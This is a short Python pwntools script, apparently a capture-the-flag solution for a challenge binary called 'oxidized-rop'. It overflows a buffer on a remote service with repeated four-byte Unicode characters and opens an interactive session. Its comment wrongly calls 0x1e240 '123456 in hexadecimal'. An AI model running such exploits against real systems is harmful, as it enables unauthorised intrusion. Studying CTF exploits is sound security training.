#!/usr/bin/env python3

from pwn import *
import sys

EXP_OFFSET = 0x1e8 - 0x50
FILLER = '\U0001e240' # 123456 in hexadecimal

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('Usage: writup.py IP:PORT')
        exit(1)
    
    IP, PORT = sys.argv[1].split(':')

    prog = ELF('oxidized-rop')
    context.binary = prog.path

    warn(f'Pin offset at: {EXP_OFFSET}')
    
    with remote(IP, PORT) as run:
        run.sendlineafter(b': ', b'1')
        run.sendlineafter(b': ', bytes(FILLER, 'utf-8') * (EXP_OFFSET // 4 + 1))
        run.sendlineafter(b': ', b'2')
        run.interactive()
